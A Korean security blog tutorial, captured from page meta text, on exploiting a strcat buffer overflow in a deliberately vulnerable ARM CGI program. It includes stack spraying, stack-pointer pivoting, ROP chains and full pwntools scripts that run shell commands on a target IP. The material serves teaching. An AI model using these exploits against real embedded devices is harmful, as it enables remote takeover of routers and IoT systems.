80) p.send(packet) r = p.recv().decode() r = r[r.find(&quot;- ifconfig&quot;):r.find(&quot;\n\n\n&quot;)+2] dummy_len = 0x204 - len(r) p.close() log.info(&quot;Exploit.&quot;) while True: stack = 0xbefe1dd4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) p = remote(ip, 80) p.send(packet) r = p.recv() p.close() if r.find(b&quot;200 OK&quot;) != -1: break log.info(&quot;Success!&quot;) if __name__ == &quot;__main__&quot;: if (len(sys.argv) == 3): exploit(sys.argv[1], sys.argv[2]) else: print(&quot;{} [target-ip] [shell command]&quot;.format(sys.argv[0])) 끝내면서 CGI를 공격하는 방법에 대해 알아보았습니다. 일반적으로 웹 CGI 프로그램 혹은 CGI는 문자열을 처리하는 코드가 많습니다. 문자열을 처리하는 코드에서 주로 발생할 수 있는 String copy buffer overflow의 공격 방법에 대해 알아보았고, 안정적인 공격 코드를 작성하는 법에 대해 알아 보았습니다. 추가적인 질문 사항과 수정사항은 dhkim@stealien.com으로 남겨 주시면 감사하겠습니다. https://www.lighttpd.net/ &#8617; CGI Environment Variables &#8617; strcat &#8617; Buffer overflow &#8617; Return oriented programming &#8617;" />
<meta property="og:description" content="Common ways to exploit CGI Buffer overflow. 다양한 임베디드 서비스 및 IoT에서 사용되는 CGI 프로그램을 공격하는 일반적인 방법에 대해 알아 보겠습니다. Common Gateway Interface CGI는 웹 서버상에서 사용자 프로그램을 동작시키기 위한 조합입니다. 존재하는 많은 웹 서버 프로그램은 CGI의 기능을 이용할 수 있습니다. CGI는 환경변수나 표준입출력을 다룰 수 있는 프로그램 언어에서라면 언어의 구별을 묻지 않고 확장하여 이용하는 것이 가능하나, 실행속도나 텍스트 처리의 용이함 등의 균형에 의해 펄이 사용되는 경우가 많았습니다.[^1] CGI는 주로 Router, NAS와 같은 다양한 Embedded device, IoT Service를 위해 사용됩니다. | Server | +--------+ | +-------------+ +-------------+ | Client |&lt;=---HTTP---=&gt;| HTTP Server |&lt;=---=&gt;| CGI Program | +--------+ | +-------------+ +-------------+ | | CGI: How-to Lighttpd1와 같이 HTTP 프로토콜을 처리하여 CGI 프로그램으로 전달 할 수 있는 웹 서버 역할을 하는 프로그램을 한가지 선정합니다. 그 후에 CGI 규약에 맞게 프로그램을 작성하면 됩니다. 본 챕터에서는 공격하기 위해 알아야하는 몇가지를 설명하겠습니다. 환경변수 환경변수에는 HTTP 프로토콜을 통해 클라이언트에게 제공받은 정보가 저장됩니다. 임의로 변조된 사용자의 값이 전달 될 수 있는 벡터는 다음과 같습니다.2 HTTP_COOKIE : 클라이언트의 Cookie입니다. HTTP_USER_AGENT : 클라이언트의 User agent입니다. QUERY_STRING : 클라이언트에게 제공받은 GET 쿼리 문자열입니다. 표준입출력 표준 출력을 통해 cgi 페이지로 접근한 클라이언트에게 그 내용을 전달할 수 있습니다. POST와 같은 HTTP Method를 서비스 하기 위해 CGI에서는 표준입력을 사용합니다. POST의 데이터를 전달 받기 위해서는 단순히 표준입력을 받기만 하면 우리는 POST를 통해 전달 된 데이터를 받아낼 수 있습니다. CGI 공격 vuln.c #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;fcntl.h&gt; char *param; int param_count; static inline char h2c(char h) // F -&gt; 15 { if (h &gt;= &#39;a&#39; &amp;&amp; h &lt;= &#39;f&#39;) return h - &#39;a&#39; + 0xa; if (h &gt;= &#39;A&#39; &amp;&amp; h &lt;= &#39;F&#39;) return h - &#39;A&#39; + 0xa; return h - &#39;0&#39;; } char u2c(char *u) // %00 -&gt; \x00 { char ret = 0; if (*u == &#39;%&#39;) { ret += h2c(*(u+1)) * 0x10; ret += h2c(*(u+2)) * 0x01; } return ret; } int urldecode(char *s) { int index1 = 0; int index2 = 0; if (!s) return 1; if (s[index2] == &#39;?&#39;) index2++; param = s; param_count = 0; while (s[index2]) { if (s[index2] == &#39;%&#39;) { s[index1++] = u2c(s+index2); index2 += 3; } else if (s[index2] == &#39;&amp;&#39;) { s[index1++] = &#39;\0&#39;; index2++; } else { if (s[index2] == &#39;=&#39;) param_count++; s[index1++] = s[index2++]; } } s[index1] = &#39;\0&#39;; return 0; } int get_val(char *name, char *dest, size_t size) { int err = 1; char *param_c = param; size_t param_len = strlen(param_c); size_t name_len = strlen(name); if (!param || !param_count) { printf(&quot;no query.\n&quot;); return 1; } for (int i = 0; i &lt; param_count; i++) { if (!memcmp(name, param_c, name_len) &amp;&amp; param_c[name_len] == &#39;=&#39;) { param_c += name_len + 1; strncpy(dest, param_c, size); err = 0; break; } else { param_c += param_len+1; param_len = strlen(param_c); } } return err; } int main(int argc, char **argv, char **envp) { char out[512]; char cmd[256]; char buf[256]; if (urldecode(getenv(&quot;QUERY_STRING&quot;))) { printf(&quot;urldecode error.\n&quot;); return -1; } memset(out, 0, sizeof(out)); memset(cmd, 0, sizeof(cmd)); memset(buf, 0, sizeof(buf)); if (!get_val(&quot;time&quot;, buf, sizeof(buf)) &amp;&amp; buf[0] == &#39;y&#39;) strcat(cmd, &quot;echo &#39;- time ------&#39; &gt;&gt; /tmp/out &amp;&amp; date &gt;&gt; /tmp/out;&quot;); if (!get_val(&quot;ifconfig&quot;, buf, sizeof(buf)) &amp;&amp; buf[0] == &#39;y&#39;) strcat(cmd, &quot;echo &#39;- ifconfig --&#39; &gt;&gt; /tmp/out &amp;&amp; ifconfig bond0 &gt;&gt; /tmp/out;&quot;); if (!get_val(&quot;uname&quot;, buf, sizeof(buf)) &amp;&amp; buf[0] == &#39;y&#39;) strcat(cmd, &quot;echo &#39;- uname -----&#39; &gt;&gt; /tmp/out &amp;&amp; uname -a &gt;&gt; /tmp/out;&quot;); system(&quot;rm -f /tmp/out&quot;); system(cmd); int fd; if ((fd = open(&quot;/tmp/out&quot;, O_RDONLY)) &lt; 0) return -1; read(fd, out, sizeof(out)); close(fd); if (!get_val(&quot;comment&quot;, buf, 0x100)) strcat(out, buf); puts(out); return 0; } 위 샘플 코드는 시스템의 time, ifconfig, uname의 결과값을 출력 해 주는 간단한 프로그램입니다. L109 QUERY_STRING을 통해 인풋 받는 GET Query의 디코딩을 처리합니다. L119~124 time, ifconfig, uname을 실행하는 명령어 조합을 cmd 버퍼에 복사합니다. L126~127 /tmp/out을 삭제 후 cmd 버퍼의 내용대로 명령어를 실행합니다. L129~133 /tmp/out 파일을 읽어 out버퍼에 복사합니다. L135~136 comment 의 값이 유효할 경우 그 값을 out 버퍼에 복사합니다. L138 out을 출력합니다. L136에서 strncat 대신 strcat3을 사용하기 때문에, out 버퍼에 이미 많은 양의 데이터가 채워져 있을 경우의 예외를 처리하지 않습니다. 이로 인해 Buffer overflow4가 발생하게 됩니다. 취약점 증명 취약점을 증명하기 위해 간단히 웹 브라우저를 사용할 수 있습니다. 위는 정상적인 프로그램의 실행 흐름을 나타냅니다. 위는 다수의 데이터를 comment 파라미터를 통해 전달 할 경우를 보여줍니다. Lighttpd의 경우 다음과 같이 core dump를 활성화 시킬 수 있습니다. cgi 프로그램이 존재하는 디렉토리에 core dump가 생성됩니다. $ echo &#39;server.core-files = &quot;enable&quot;&#39; &gt;&gt; /etc/lighttpd.conf $ kill -9 `pidof lighttpd` $ lighttpd -f /etc/lighttpd.conf -m /usr/local/lib 그 후, 해당 프로그램의 core dump를 확인합니다. /home/314ckC47 # ./gdb -q -c /path/to/core [New LWP 6007] Core was generated by `vuln.cgi&#39;. Program terminated with signal 11, Segmentation fault. #0 0x61616160 in ?? () (gdb) i r pc pc 0x61616160 0x61616160 $pc 레지스터가 변조 된 것을 알 수 있습니다. 공격 제약 일반적인 BOF 공격은 Return Oriented Programming(ROP)5을 주로 사용합니다. 하지만 이번 취약점을 공격하기에는 몇가지 제약이 있습니다. 문자열 복사를 통해 발생하는 Buffer overflow이기 때문에, ROP Payload에 Null byte가 포함 될 경우 성공적으로 공격을 수행할 수 없습니다. 공격에 사용할 수 있는 정적인 주소가 프로그램(vuln.cgi)이 로드 된 지점밖에 없습니다. 프로그램이 로드 된 주소값의 상위 1바이트는 Null-byte입니다. 이런 상황에서 구상할 수 있는 Payload는 다음과 같습니다. &lt;= 0x00000000 0xffffffff =&gt; +-----+-(out)---------------+-(BP)-+-(PC)-+-----+ | ... | ............ &#39;a&#39;*63 | BASE | JUMP | ... | +-----+---------------------+------+------+-----+ === Overflow ==&gt; JUMP에는 상위 1바이트가 Null-byte인 주소값을 삽입할 수 있습니다. BASE에는 Null-byte가 존재하지 않는 어떤 값을 삽입할 수 있습니다. 이런 모든 조건을 종합 해 보았을 때, 우리는 다음과 같이 공격을 구상해야합니다. PC를 단 한번 변조하여 공격자가 원하는 코드의 흐름을 획득 해야합니다. 연속적인 함수의 호출 또는 인자의 구성을 위해 Null-byte를 삽입할 수 있는 영역이 필요합니다. 연속적인 함수의 호출 또는 인자의 구성을 위해 SP를 변조할 수 있어야 합니다. Stack spray QUERY_STRING 환경변수는 스택에 저장되어 있습니다. 이를 활용하면 다음과 같이 Stack spray를 시도 할 수 있습니다. #!/usr/bin/python3 from pwn import * e = ELF(&quot;./vuln&quot;) def form_packet(ip, param): packet = &quot;&quot; packet += &quot;GET http://{}/vuln.cgi?{} HTTP/1.1\r\n&quot;.format(ip, param) packet += &quot;Host: {}\r\n&quot;.format(ip) packet += &quot;Connection: keep-alive\r\n&quot; packet += &quot;Content-Length: 0\r\n&quot; packet += &quot;User-Agent: Mozilla/5.0\r\n&quot; packet += &quot;Accept: */*\r\n&quot; packet += &quot;Origin: http://{}\r\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\r\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\r\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n&quot; packet += &quot;\r\n&quot; return packet.encode() def form_param(payload, spray): return &quot;&amp;&quot;.join([&quot;ifconfig=y&quot;, &quot;comment=&quot;+payload, &quot;s=&quot;+spray]) def exploit(ip): payload = &#39;a&#39;*63 + &quot;STCK&quot; + &quot;JUMP&quot; spray = &#39;b&#39;*0x10000 param = form_param(payload, spray) packet = form_packet(ip, param) p = remote(ip, 80) p.send(packet) r = p.recv(1024).decode() log.info(r) p.close() if __name__ == &quot;__main__&quot;: if (len(sys.argv) == 2): exploit(sys.argv[1]) else: print(&quot;{} [target-ip]&quot;.format(sys.argv[0])) 실제로 스택에 스프레이가 되었는지 확인합니다. (gdb) x/16wx $sp+0x380 0xbec65db8: 0x61616161 0x61616161 0x61616161 0x61616161 0xbec65dc8: 0x64646161 0x44446464 0x73004444 0x6262623d 0xbec65dd8: 0x62626262 0x62626262 0x62626262 0x62626262 0xbec65de8: 0x62626262 0x62626262 0x62626262 0x62626262 (gdb) x/16wx $sp+0x380+0x10000 0xbec75db8: 0x62626262 0x62626262 0x62626262 0x62626262 0xbec75dc8: 0x62626262 0x62626262 0x62626262 0x45520062 0xbec75dd8: 0x53455551 0x52555f54 0x762f3d49 0x2e6e6c75 0xbec75de8: 0x3f696763 0x6f636669 0x6769666e 0x6326793d (gdb) 스프레이가 잘 되었음을 확인 했습니다. 또한 Null-byte의 삽입이 가능한지의 여부를 확인합니다. # ... def exploit(ip): payload = &#39;a&#39;*63 + &#39;dddd&#39; + &#39;DDDD&#39; spray = &#39;%00&#39;*4 + &#39;b&#39;*(0x10000-12) param = form_param(payload, spray) packet = form_packet(ip, param) # ... 4바이트의 null을 삽입 해 봅니다. (gdb) x/16wx $sp+0x380 0xbed44db8: 0x61616161 0x61616161 0x61616161 0x61616161 0xbed44dc8: 0x64646161 0x44446464 0x73004444 0x0000003d 0xbed44dd8: 0x62626200 0x62626262 0x62626262 0x62626262 0xbed44de8: 0x62626262 0x62626262 0x62626262 0x62626262 (gdb) x/16wx $sp+0x380+0x10000 0xbed54db8: 0x62626262 0x62626262 0x62626262 0x62626262 0xbed54dc8: 0x62626262 0x62620062 0x62626262 0x45520062 0xbed54dd8: 0x53455551 0x52555f54 0x762f3d49 0x2e6e6c75 0xbed54de8: 0x3f696763 0x6f636669 0x6769666e 0x6326793d (gdb) Null-byte를 삽입할 수 있는 영역임을 확인 했습니다. Stack Pointer 변조 armv7에서 R11 레지스터는 x86의 ebp와 같은 역할을 수행합니다. (gdb) disas main ... 0x00010c9c &lt;+624&gt;: mov r0, r3 // -- main epilogue -- 0x00010ca0 &lt;+628&gt;: sub sp, r11, #4 // r11(bp)에서 4를 뺀 값을 sp에 저장합니다. 0x00010ca4 &lt;+632&gt;: pop {r11, pc} // 스택에서 r11, pc를 순차적으로 pop합니다. ... 이를 활용하면 Stack pointer(sp)를 변조할 수 있습니다. 아래와 같은 순서의 명령을 수행한다고 가정합니다. ### Stage 1 ###################################################### +-Code-------------+---------------------------------------------+ | pc &gt; 0x00010ca0 | sub sp, r11, #4 | | 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f00 | | r11 0xbfff8f14 | +----------------------------------------------------------------+ ### Stage 2 ###################################################### +-Code-------------+---------------------------------------------+ | 0x00010ca0 | sub sp, r11, #4 | | pc &gt; 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f10 * | | r11 0xbfff8f14 | +----------------------------------------------------------------+ * r11에서 4를 뺀 값을 sp에 넣었습니다. ### Stage 3 ###################################################### +-Code-------------+---------------------------------------------+ | pc &gt; 0x00010ca0 | sub sp, r11, #4 | | 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f10 | | r11 0xbfff8f24 * | +----------------------------------------------------------------+ * sp(0xbfff8f10)에서 r11, pc를 pop 했습니다. ### Stage 4 ###################################################### +-Code-------------+---------------------------------------------+ | 0x00010ca0 | sub sp, r11, #4 | | pc &gt; 0x00010ca4 | pop {r11, pc} | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f20 * | | r11 0xbfff8f24 | +----------------------------------------------------------------+ * r11에서 4를 뺀 값을 sp에 넣었습니다. sp의 값이 우리가 원하는 값(0xbfff8f20)으로 변조되었습니다. ### Stage 5 ###################################################### +-Code-------------+---------------------------------------------+ | pc &gt; 0x41414141 | ........................................... | +------------------+---------------------------------------------+ +-Stack------------+----------0----------4----------8----------c-+ | 0xbfff8f00 | 0x00000000 0x00000000 0x00000000 0x00000000 | | 0xbfff8f10 | 0xbfff8f24 0x00010ca0 0x00000000 0x00000000 | | 0xbfff8f20 | 0x41414141 0x41414141 0x41414141 0x41414141 | +------------------+---------------------------------------------+ +-Register-------------------------------------------------------+ | sp 0xbfff8f28 | | r11 0x41414141 | +----------------------------------------------------------------+ * pc와 r11이 변조되었습니다. 위와 같은 방법으로 연속적인 함수의 호출 또는 인자의 구성을 위해 SP를 변조할 수 있습니다. 공격코드 작성 위 두가지 방법을 이용하면 다음과 같은 흐름으로 공격을 수행합니다. QUERY_STRING을 전달함으로 BOF를 발생시키고, 스택에 ROP Payload를 spray합니다. SP를 Stack spray된 영역으로 변조합니다. ROP Payload를 수행합니다. ASLR이 비활성화 되어있으면, ROP Payload를 즉각적으로 수행 할 수 있습니다. ASLR이 활성화 되어있으면, SP가 잘못된 영역을 역참조 할 수 있습니다. 이럴경우, 1을 다시 수행합니다. Case: ASLR 비활성화 다음과 같이 ASLR을 비활성화 할 수 있습니다. # echo 0 &gt; /proc/sys/kernel/randomize_va_space # cat /proc/sys/kernel/randomize_va_space 0 ASLR이 비활성화 된 후, 스프레이를 먼저 수행하여 core dump를 확인합니다. (gdb) x/32wx $sp+0x380 0xbefe1d98: 0x6161616b 0x6161616c 0x6161616d 0x6161616e 0xbefe1da8: 0xbefe1ddc 0x44444444 0x3d737300 0x41414141 0xbefe1db8: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1dc8: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1dd8: 0x41414141 0x41414141 0x41414141 0x41414141 Stack spray가 0xbefe1db4에서 시작합니다. 해당 주소로 sp를 변조합니다. SPRAY_LEN = 0xf000 leave = 0x00010ca0 # sub sp, r11, 4; pop {r11, pc} def payload(r11, lr, dummy_len): payload = cyclic(dummy_len).decode() payload += purl32(r11) payload += purl32(lr) return payload def spray(): spray = &quot;A&quot;*SPRAY_LEN return spray def exploit(): # ... stack = 0xbefe1db4+4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) # ... 위의 코드를 실행 후 다시 gdb로 확인합니다. (gdb) x/16wx $sp-0x10 0xbefe1dac: 0x00010ca0 0x3d737300 0x41414141 0x41414141 0xbefe1dbc: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1dcc: 0x41414141 0x41414141 0x41414141 0x41414141 0xbefe1ddc: 0x41414141 0x41414141 0x41414141 0x41414141 (gdb) i r pc pc 0x41414140 0x41414140 (gdb) 정상적으로 pc가 변조되었습니다. Return sled Return sled를 이용하여 스프레이한 영역의 어느곳으로 sp, pc가 변조되어도 공격자의 ROP Payload가 실행되도록 합니다. 0x00010ca4: pop {r11, pc} 0x000108e0: pop {r4, r11, pc} 위의 두 가젯을 활용합니다. ... | 0x00010ca4 | 0x00010ca4 | 0x000108e0 | 0x00010ca4 # r4 | 0x41414141 # r11 V [ROP HERE] # pc def spray(): # ... spray += purl32(sled_1) * (((SPRAY_LEN-len(rop)) // EADDR_LEN)-3) spray += purl32(sled_2) + purl32(sled_1) + &quot;AAAA&quot; spray += rop return spray ROP Return-to-csu를 활용합니다. def chain(func, r0, r1, r2): c = &#39;&#39; c += purl32(0x00000000) # r4 c += purl32(func) # [r5] =&gt; r3 c += purl32(0x00000000) # r6 c += purl32(r0) # r7 =&gt; r0 c += purl32(r1) # r8 =&gt; r1 c += purl32(r2) # r9 =&gt; r2 c += purl32(0x00000000) # r10 c += purl32(csu_2) # pc return c def spray(): #... # Return-to-csu. rop = purl32(csu_1) # Set bss:0x20 to get_val address. for i in range(4): addr = e.bss(0x20+i) value = e.symbols[&#39;get_val&#39;] &gt;&gt; (i*8) &amp; 0xff rop += chain(e.got[&#39;memset&#39;], addr, value, 1) # get_val(&quot;t&quot;, bss:0x24, 2): returns &quot;sh&quot; rop += chain(e.bss(0x20), str_t, e.bss(0x24), 2) # get_val rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) #... chain() 함수는 Return-to-csu 가젯을 자동으로 구성 해 줍니다. L18~22 : bss:0x20 지점에 get_val 함수의 포인터를 작성합니다. L25 : get_val 함수를 이용해 QUERY_STRING에서 t 쿼리의 값을 bss:0x24 지점에 작성합니다. 그 값은 &quot;sh&quot; 입니다. L26 : system 함수를 이용해 쉘을 실행시킵니다. 명령어 전달 ROP Payload가 수행되고 나면, 쉘 프로세스가 실행되고, 명령어 입력까지 대기합니다. POST 메소드를 이용해 Standard input으로 쉘 명령을 전달하여 실행시킵니다. def form_packet(ip, param, content=&#39;&#39;): packet = &quot;&quot; packet += &quot;POST http://{}/vuln.cgi?{} HTTP/1.1\r\n&quot;.format(ip, param) packet += &quot;Host: {}\r\n&quot;.format(ip) packet += &quot;Connection: keep-alive\r\n&quot; packet += &quot;Content-Length: {}\r\n&quot;.format(len(content)) packet += &quot;User-Agent: Mozilla/5.0\r\n&quot; packet += &quot;Accept: */*\r\n&quot; packet += &quot;Origin: http://{}\r\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\r\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\r\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n&quot; packet += &quot;\r\n&quot; packet += content packet += &quot;\r\n&quot; return packet.encode() 안정화 작업 def exploit(ip, command): # ifconfig&#39;s output length is not fixed. # So, we need to get the buffer first to calculate # the overflow size. log.info(&quot;Getting buffer.&quot;) packet = form_packet(ip, form_param()) p = remote(ip, 80) p.send(packet) r = p.recv().decode() r = r[r.find(&quot;- ifconfig&quot;):r.find(&quot;\n\n\n&quot;)+2] dummy_len = 0x204 - len(r) p.close() log.info(&quot;Exploit.&quot;) stack = 0xbefe1db4+4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) p = remote(ip, 80) p.send(packet) p.close() log.info(&quot;Success!&quot;) ifconfig 명령의 출력값의 길이가 고정되어있지 않습니다. 오버플로우 사이즈를 안정적으로 계산하기 위해 ifconfig 명령 결과 버퍼의 길이값을 측정하고, 계산합니다. no-ASLR 공격 코드 #!/usr/bin/python3 from pwn import * e = ELF(&quot;./vuln&quot;) # Globals &amp; Defines spray_fix = &#39;&#39; SPRAY_LEN = 0xf000 EADDR_LEN = 12 # Gadgets sled_1 = 0x00010ca4 # pop {r11, pc} sled_2 = 0x000108e0 # pop {r4, r11, pc} csu_1 = 0x00010d28 csu_2 = 0x00010d0c leave = 0x00010ca0 # sub sp, r11, 4; pop {r11, pc} # ETC. str_t = 0x10e66 def purl32(value): a = (value &amp; 0x000000ff) &gt;&gt; 0 b = (value &amp; 0x0000ff00) &gt;&gt; 8 c = (value &amp; 0x00ff0000) &gt;&gt; 16 d = (value &amp; 0xff000000) &gt;&gt; 24 return &quot;%{:02x}%{:02x}%{:02x}%{:02x}&quot;.format(a,b,c,d) def form_packet(ip, param, content=&#39;&#39;): packet = &quot;&quot; packet += &quot;POST http://{}/vuln.cgi?{} HTTP/1.1\r\n&quot;.format(ip, param) packet += &quot;Host: {}\r\n&quot;.format(ip) packet += &quot;Connection: keep-alive\r\n&quot; packet += &quot;Content-Length: {}\r\n&quot;.format(len(content)) packet += &quot;User-Agent: Mozilla/5.0\r\n&quot; packet += &quot;Accept: */*\r\n&quot; packet += &quot;Origin: http://{}\r\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\r\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\r\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n&quot; packet += &quot;\r\n&quot; packet += content packet += &quot;\r\n&quot; return packet.encode() def form_param(payload=&#39;&#39;, spray=&#39;&#39;): p = [&quot;t=sh&quot;, &quot;ifconfig=y&quot;] if payload: p.append(&quot;comment=&quot;+payload) if spray: p.append(&quot;ss=&quot;+spray) return &quot;&amp;&quot;.join(p) def payload(r11, lr, dummy_len=54): payload = cyclic(dummy_len).decode() payload += purl32(r11) payload += purl32(lr) return payload def chain(func, r0, r1, r2): c = &#39;&#39; c += purl32(0x00000000) # r4 c += purl32(func) # [r5] =&gt; r3 c += purl32(0x00000000) # r6 c += purl32(r0) # r7 =&gt; r0 c += purl32(r1) # r8 =&gt; r1 c += purl32(r2) # r9 =&gt; r2 c += purl32(0x00000000) # r10 c += purl32(csu_2) # pc return c def spray(): # If we already got spray buffer, use it. global spray_fix if len(spray_fix): return spray_fix # Return-to-csu. rop = purl32(csu_1) # Set bss:0x20 to get_val address. for i in range(4): addr = e.bss(0x20+i) value = e.symbols[&#39;get_val&#39;] &gt;&gt; (i*8) &amp; 0xff rop += chain(e.got[&#39;memset&#39;], addr, value, 1) # get_val(&quot;t&quot;, bss:0x24, 2): returns &quot;sh&quot; rop += chain(e.bss(0x20), str_t, e.bss(0x24), 2) # get_val # system(&quot;sh&quot;) rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) # Forming spray. spray = &#39;a&#39; * (SPRAY_LEN % EADDR_LEN) # padd spray += purl32(sled_1) * (((SPRAY_LEN-len(rop)) // EADDR_LEN)-3) spray += purl32(sled_2) + purl32(sled_1) + &quot;AAAA&quot; spray += rop # Fix the spray buffer. spray_fix = spray return spray def exploit(ip, command): # ifconfig&#39;s output length is not fixed. # So, we need to get the buffer first to calculate # the overflow size. log.info(&quot;Getting buffer.&quot;) packet = form_packet(ip, form_param()) p = remote(ip, 80) p.send(packet) r = p.recv().decode() r = r[r.find(&quot;- ifconfig&quot;):r.find(&quot;\n\n\n&quot;)+2] dummy_len = 0x204 - len(r) p.close() log.info(&quot;Exploit.&quot;) stack = 0xbefe1db4+4 pload = payload(stack, leave, dummy_len) param = form_param(pload, spray()) packet = form_packet(ip, param, command) p = remote(ip, 80) p.send(packet) p.close() log.info(&quot;Success!&quot;) if __name__ == &quot;__main__&quot;: if (len(sys.argv) == 3): exploit(sys.argv[1], sys.argv[2]) else: print(&quot;{} [target-ip] [shell command]&quot;.format(sys.argv[0])) bc@machine $ ./exploit.py 172.16.13.9 &#39;echo PWNED &gt; /tmp/pwned&#39; [*] &#39;/mnt/c/Users/314ckC47/Documents/CGI Exploitation/source/vuln&#39; Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x10000) [*] Getting buffer. [*] Exploit. [*] Success! /home/314ckC47 $ cat /tmp/pwned PWNED Case: ASLR 활성화 다음과 같이 ASLR을 활성화합니다. # echo 0 &gt; /proc/sys/kernel/randomize_va_space # cat /proc/sys/kernel/randomize_va_space 0 종료 조건 sp가 참조하는 지점에 대해 Brute-forcing을 수행합니다. Brute-forcing의 종료 조건을 위해 ROP Payload가 성공적으로 수행 될 경우 프로그램을 abort시켜 500 Internal error를 발생시키지 않도록 합니다. # system(&quot;sh&quot;) rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) # abort rop += &quot;AAAA&quot;*7 + purl32(abort) ASLR 공격 코드 #!/usr/bin/python3 from pwn import * e = ELF(&quot;./vuln&quot;) # Globals &amp; Defines spray_fix = &#39;&#39; SPRAY_LEN = 0xf000 EADDR_LEN = 12 # Gadgets sled_1 = 0x00010ca4 # pop {r11, pc} sled_2 = 0x000108e0 # pop {r4, r11, pc} csu_1 = 0x00010d28 csu_2 = 0x00010d0c leave = 0x00010ca0 # sub sp, r11, 4; pop {r11, pc} # ETC. str_t = 0x00010e66 abort = 0x0001055c def purl32(value): a = (value &amp; 0x000000ff) &gt;&gt; 0 b = (value &amp; 0x0000ff00) &gt;&gt; 8 c = (value &amp; 0x00ff0000) &gt;&gt; 16 d = (value &amp; 0xff000000) &gt;&gt; 24 return &quot;%{:02x}%{:02x}%{:02x}%{:02x}&quot;.format(a,b,c,d) def form_packet(ip, param, content=&#39;&#39;): packet = &quot;&quot; packet += &quot;POST http://{}/vuln.cgi?{} HTTP/1.1\r\n&quot;.format(ip, param) packet += &quot;Host: {}\r\n&quot;.format(ip) packet += &quot;Connection: keep-alive\r\n&quot; packet += &quot;Content-Length: {}\r\n&quot;.format(len(content)) packet += &quot;User-Agent: Mozilla/5.0\r\n&quot; packet += &quot;Accept: */*\r\n&quot; packet += &quot;Origin: http://{}\r\n&quot;.format(ip) packet += &quot;Referer: http://{}/home.cgi\r\n&quot;.format(ip) packet += &quot;Accept-Encoding: gzip, deflate\r\n&quot; packet += &quot;Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7\r\n&quot; packet += &quot;\r\n&quot; packet += content packet += &quot;\r\n&quot; return packet.encode() def form_param(payload=&#39;&#39;, spray=&#39;&#39;): p = [&quot;t=sh&quot;, &quot;ifconfig=y&quot;] if payload: p.append(&quot;comment=&quot;+payload) if spray: p.append(&quot;ss=&quot;+spray) return &quot;&amp;&quot;.join(p) def payload(r11, lr, dummy_len=54): payload = cyclic(dummy_len).decode() payload += purl32(r11) payload += purl32(lr) return payload def chain(func, r0, r1, r2): c = &#39;&#39; c += purl32(0x00000000) # r4 c += purl32(func) # [r5] =&gt; r3 c += purl32(0x00000000) # r6 c += purl32(r0) # r7 =&gt; r0 c += purl32(r1) # r8 =&gt; r1 c += purl32(r2) # r9 =&gt; r2 c += purl32(0x00000000) # r10 c += purl32(csu_2) # pc return c def spray(): # If we already got spray buffer, use it. global spray_fix if len(spray_fix): return spray_fix # Return-to-csu. rop = purl32(csu_1) # Set bss:0x20 to get_val address. for i in range(4): addr = e.bss(0x20+i) value = e.symbols[&#39;get_val&#39;] &gt;&gt; (i*8) &amp; 0xff rop += chain(e.got[&#39;memset&#39;], addr, value, 1) # get_val(&quot;t&quot;, bss:0x24, 2): returns &quot;sh&quot; rop += chain(e.bss(0x20), str_t, e.bss(0x24), 2) # get_val # system(&quot;sh&quot;) rop += chain(e.got[&#39;system&#39;], e.bss(0x24), 0, 0) # abort rop += &quot;AAAA&quot;*7 + purl32(abort) # Forming spray. spray = &#39;a&#39; * (SPRAY_LEN % EADDR_LEN) # padd spray += purl32(sled_1) * 